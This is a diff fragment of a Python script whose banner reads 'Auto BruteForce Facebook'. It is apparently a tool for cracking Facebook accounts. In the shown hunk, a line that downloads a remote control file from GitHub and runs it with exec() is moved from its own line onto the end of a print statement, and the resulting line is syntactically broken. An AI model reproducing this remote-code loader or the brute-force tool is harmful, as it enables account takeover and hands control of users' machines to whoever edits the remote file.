@@ -18,8 +18,9 @@ G = '\033[1;32m'
 O = '\033[33m'
 C = '\033[36m'
 
-exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
 
+print("\t[ Auto BruteForce Facebook ]")	exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
+print("\t    [ coded By deray ]\n")
 
 
 def ngontol():
